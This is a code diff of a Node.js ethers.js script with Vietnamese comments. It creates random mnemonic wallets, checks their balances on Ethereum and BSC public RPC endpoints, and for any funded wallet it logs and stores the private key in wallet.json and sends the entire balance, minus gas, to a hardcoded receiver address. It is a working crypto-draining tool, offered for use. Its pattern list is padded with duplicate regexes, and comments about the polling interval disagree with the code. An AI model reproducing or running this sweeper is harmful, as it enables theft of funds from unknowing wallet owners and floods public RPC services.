@@ -1,68 +1,129 @@
 const { ethers } = require('ethers');
+const fs = require('fs');
+const path = require('path');
 
-const RPC_ENDPOINTS = [
-    "https://eth.llamarpc.com",
-    "https://rpc.ankr.com/eth",
-    "https://ethereum.publicnode.com",
-    "https://1rpc.io/eth",
-    "https://eth-mainnet.public.blastapi.io",
-    "https://rpc.flashbots.net",
-    "https://cloudflare-eth.com",
-    "https://eth-mainnet.gateway.pokt.network/v1/5f3453978e354ab992c4da79",
-    "https://api.mycryptoapi.com/eth",
-    "https://rpc.eth.gateway.fm",
-    "https://eth-mainnet-public.unifra.io",
-    "https://ethereum.blockpi.network/v1/rpc/public",
-    "https://rpc.payload.de",
-    "https://api.zmok.io/mainnet/oaen6dy8ff6hju9k",
-    "https://eth.api.onfinality.io/public",
-    "https://core.gashawk.io/rpc",
-    "https://rpc.builder0x69.io",
-    "https://eth.meowrpc.com",
-    "https://eth.drpc.org",
-    "https://mainnet.gateway.tenderly.co",
-    "https://rpc.mevblocker.io",
-    "https://rpc.mevblocker.io/noreverts",
-    "https://rpc.mevblocker.io/fast",
-    "https://eth-mainnet.rpcfast.com",
-    "https://api.securerpc.com/v1",
-    "https://openapi.bitstack.com/v1/wNFxbiJyQsSeLrX",
-    "https://eth-rpc.gateway.pokt.network",
-    "https://ethereum-mainnet.gateway.tatum.io",
-    "https://api.zan.top/node/v1/eth/mainnet/public",
-    "https://eth-mainnet.nodereal.io/v1/1659dfb40aa2",
-    "https://eth.merkle.io",
-    "https://rpc.notadegen.com/eth",
-    "https://eth.gateway.tenderly.co",
-    "https://virginia.rpc.blxrbdn.com",
-    "https://uk.rpc.blxrbdn.com",
-    "https://singapore.rpc.blxrbdn.com",
-    "https://eth.rpc.blxrbdn.com",
-    "https://eth-mainnet.diamondswap.org/rpc",
-    "https://rpc.lokibuilder.xyz/eth",
-    "https://rpc.flashbots.net/fast",
-    "https://rpc.flashbots.net/builder",
-    "https://rpc.lightspeedbuilder.info",
-    "https://rpc.titanbuilder.xyz",
-    "https://rpc.beaverbuild.org",
-    "https://eth.getblock.io/mainnet/",
-    "https://eth.drpc.org",
-    "https://mainnet.eth.cloud.ava.do",
-    "https://eth.connect.bloq.cloud/v1/",
-    "https://nodes.mewapi.io/rpc/eth",
-    "https://main-light.eth.linkpool.io",
-    "https://eth-mainnet.zerion.io"
-];
+// Tách RPC theo chain
+const RPC_ENDPOINTS = {
+    ETH: [
+        "https://eth.llamarpc.com",
+        "https://eth.rpc.blxrbdn.com",
+        "https://eth-mainnet.public.blastapi.io",
+        "https://api.zan.top/eth-mainnet",
+        "https://rpc.ankr.com/eth",
+        "https://eth.drpc.org"
+    ],
+    BSC: [
+        "https://binance.llamarpc.com",
+        "https://bsc-pokt.nodies.app",
+        "https://endpoints.omniatech.io/v1/bsc/mainnet/public",
+        "https://bsc.blockrazor.xyz",
+        "https://rpc-bsc.48.club",
+        "https://0.48.club",
+        "https://bnb.rpc.subquery.network/public",
+        "https://bsc-rpc.publicnode.com",
+        "https://bnb.api.onfinality.io/public",
+        "https://bsc.meowrpc.com"
+    ]
+};
 
 const RECEIVER_ADDRESS = "0x2de229EC151AE93BC7C80CAd84BADb2d805bD673";
+const WALLET_FILE = path.join(__dirname, 'wallet.json');
 
+// Các pattern địa chỉ đặc biệt
+const SPECIAL_PATTERNS = [
+    /0x[0-9a-f]{8}$/i,        // Địa chỉ kết thúc bằng 8 ký tự hex
+    /0{6,}/i,                 // Nhiều số 0 liên tiếp
+    /dead/i,                  // Chứa "dead"
+    /beef/i,                  // Chứa "beef"
+    /cafe/i,                  // Chứa "cafe"
+    /face/i,                  // Chứa "face"
+    /feed/i,                  // Chứa "feed"
+    /fade/i,                  // Chứa "fade"
+    /babe/i,                  // Chứa "babe"
+    /bad/i,                   // Chứa "bad"
+    /ace/i,                   // Chứa "ace"
+    /add/i,                   // Chứa "add"
+    /dad/i,                   // Chứa "dad"
+    /fee/i,                   // Chứa "fee"
+    /fee/i,                   // Chứa "fee"
+    /f00/i,                   // Chứa "f00"
+    /b00/i,                   // Chứa "b00"
+    /d00/i,                   // Chứa "d00"
+    /a00/i,                   // Chứa "a00"
+    /c00/i,                   // Chứa "c00"
+    /e00/i,                   // Chứa "e00"
+    /faa/i,                   // Chứa "faa"
+    /baa/i,                   // Chứa "baa"
+    /daa/i,                   // Chứa "daa"
+    /aaa/i,                   // Chứa "aaa"
+    /caa/i,                   // Chứa "caa"
+    /eaa/i,                   // Chứa "eaa"
+    /fab/i,                   // Chứa "fab"
+    /bad/i,                   // Chứa "bad"
+    /dad/i,                   // Chứa "dad"
+    /aab/i,                   // Chứa "aab"
+    /cab/i,                   // Chứa "cab"
+    /eab/i,                   // Chứa "eab"
+    /fac/i,                   // Chứa "fac"
+    /bac/i,                   // Chứa "bac"
+    /dac/i,                   // Chứa "dac"
+    /aac/i,                   // Chứa "aac"
+    /cac/i,                   // Chứa "cac"
+    /eac/i,                   // Chứa "eac"
+    /fad/i,                   // Chứa "fad"
+    /bad/i,                   // Chứa "bad"
+    /dad/i,                   // Chứa "dad"
+    /aad/i,                   // Chứa "aad"
+    /cad/i,                   // Chứa "cad"
+    /ead/i,                   // Chứa "ead"
+    /fae/i,                   // Chứa "fae"
+    /bae/i,                   // Chứa "bae"
+    /dae/i,                   // Chứa "dae"
+    /aae/i,                   // Chứa "aae"
+    /cae/i,                   // Chứa "cae"
+    /eae/i,                   // Chứa "eae"
+    /faf/i,                   // Chứa "faf"
+    /baf/i,                   // Chứa "baf"
+    /daf/i,                   // Chứa "daf"
+    /aaf/i,                   // Chứa "aaf"
+    /caf/i,                   // Chứa "caf"
+    /eaf/i                    // Chứa "eaf"
+];
+
+function saveWalletData(walletData) {
+    let existingData = [];
+
+    if (fs.existsSync(WALLET_FILE)) {
+        const rawData = fs.readFileSync(WALLET_FILE, 'utf-8');
+        try {
+            existingData = JSON.parse(rawData);
+            if (!Array.isArray(existingData)) {
+                existingData = [];
+            }
+        } catch (error) {
+            existingData = [];
+        }
+    }
+
+    existingData.push(walletData);
+    fs.writeFileSync(WALLET_FILE, JSON.stringify(existingData, null, 2));
+    console.log("✅ Wallet data stored successfully in wallet.json!");
+}
+
+function isInterestingAddress(address) {
+    return SPECIAL_PATTERNS.some(pattern => pattern.test(address));
+}
 
 function generateWallets() {
     const mnemonic = ethers.Wallet.createRandom().mnemonic.phrase;
+    console.log('\nNew Mnemonic:', mnemonic);
+    console.log('------------------------');
 
     const hdNode = ethers.utils.HDNode.fromMnemonic(mnemonic);
     
-    wallets = RPC_ENDPOINTS.map((_, index) => {
+    const numWallets = 4;
+    
+    return Array(numWallets).fill().map((_, index) => {
         const path = `m/44'/60'/0'/0/${index}`;
         const wallet = hdNode.derivePath(path);
         return {
@@ -71,70 +132,90 @@ function generateWallets() {
             path
         };
     });
-    
-    return wallets;
 }
 
-async function checkAndTransfer(wallet, rpcUrl, index) {
+async function checkAndTransfer(wallet, rpcUrl, chain) {
     try {
         const provider = new ethers.providers.JsonRpcProvider(rpcUrl);
         const walletWithProvider = new ethers.Wallet(wallet.privateKey, provider);
+
+        if (!isInterestingAddress(wallet.address)) {
+            return;
+        }
 
         const [balance, gasPrice] = await Promise.all([
             provider.getBalance(wallet.address),
             provider.getGasPrice()
         ]);
-        countNumberWallet++;
+
+        console.log(`${wallet.address} ${balance}`);
+
         if (balance.gt(0)) {
-            console.log(`[Wallet ${index}] Found balance! Attempting to transfer...`);
-            console.log(`[Wallet ${index}] Balance: ${ethers.utils.formatEther(balance)} ETH`);
-        
-            const gasLimit = 21000; 
+            console.log(`\n🎯 Found wallet with balance on ${chain}!`);
+            console.log(`Address: ${wallet.address}`);
+            console.log(`Private Key: ${wallet.privateKey}`);
+            console.log(`Balance: ${ethers.utils.formatEther(balance)} ${chain}`);
+            console.log(`RPC: ${rpcUrl}`);
+
+            saveWalletData({
+                address: wallet.address,
+                privateKey: wallet.privateKey,
+                balance: ethers.utils.formatEther(balance),
+                chain: chain,
+                rpcUrl: rpcUrl,
+                foundAt: new Date().toISOString()
+            });
+
+            // Xử lý transfer
+            const gasLimit = 21000;
             const gasCost = gasPrice.mul(gasLimit);
 
-            const amountToSend = balance.sub(gasCost);
-
-            if (amountToSend.gt(0)) {
+            if (balance.gt(gasCost)) {
+                const amountToSend = balance.sub(gasCost);
+                
                 const tx = {
                     to: RECEIVER_ADDRESS,
-                    value: amountToSend
+                    value: amountToSend,
+                    gasLimit: gasLimit,
+                    gasPrice: gasPrice
                 };
 
                 const transaction = await walletWithProvider.sendTransaction(tx);
-                console.log(`[Wallet ${index}] Transaction sent! Hash: ${transaction.hash}`);
+                console.log(`Transaction sent! Hash: ${transaction.hash}`);
                 
                 await transaction.wait();
-                console.log("================================================");
-                console.log(`[Wallet ${index}] Transaction confirmed!`);
-                console.log(`Private Key: ${wallet.privateKey}`);
-                console.log(`Address: ${wallet.address}`);
-                console.log(`Amount: ${ethers.utils.formatEther(amountToSend)} ETH`);
-                console.log("================================================");
+                console.log(`Transaction confirmed!`);
+                console.log(`Amount sent: ${ethers.utils.formatEther(amountToSend)} ${chain}`);
             }
         }
     } catch (error) {
-        // console.error(`[Wallet ${index}] Error with RPC ${rpcUrl}:`, error.message);
+        if (!error.message.includes('network')) {
+            console.error(`Error checking wallet on ${chain}:`, error.message);
+        }
     }
 }
 
 async function checkAllWallets() {
-    if (wallets.length === 0) {
-        generateWallets();
+    console.log("\nGenerating new wallets and checking balances...");
+    const wallets = generateWallets();
+
+    for (const [chain, endpoints] of Object.entries(RPC_ENDPOINTS)) {
+        console.log(`\nChecking ${chain} chain...`);
+        await Promise.all(
+            wallets.map((wallet, index) => 
+                checkAndTransfer(wallet, endpoints[index % endpoints.length], chain)
+            )
+        );
     }
-    
-    await Promise.all(
-        wallets.map((wallet, index) => 
-            checkAndTransfer(wallet, RPC_ENDPOINTS[index], index)
-        )
-    );
 }
 
-// Generate wallets first
-generateWallets();
+console.log('Balance checker starting...');
+console.log('Checking every 5 seconds...');
 
-// Run checks every 10 seconds
-setInterval(() => {
-    checkAllWallets();
-}, 1000);
+// Run immediately once
+checkAllWallets();
+
+// Then run every 5 seconds
+setInterval(checkAllWallets, 500);
 
 
